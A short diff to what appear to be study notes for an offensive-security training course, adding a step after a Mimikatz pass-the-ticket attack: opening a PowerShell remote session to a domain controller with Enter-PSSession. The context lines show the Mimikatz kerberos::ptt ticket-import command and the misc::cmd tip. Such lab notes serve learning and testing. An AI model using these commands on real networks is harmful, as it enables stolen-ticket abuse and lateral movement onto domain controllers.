@@ -36,3 +36,9 @@ kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaint
 ``
 Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.
 ``
+**Alternatively!**
+We can launch powershell after performing ptt attack
+```bash
+Enter-PSSession -ComputerName DC01
+```
+![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/7217a393-2261-4ee4-bee5-b82a9d821073)
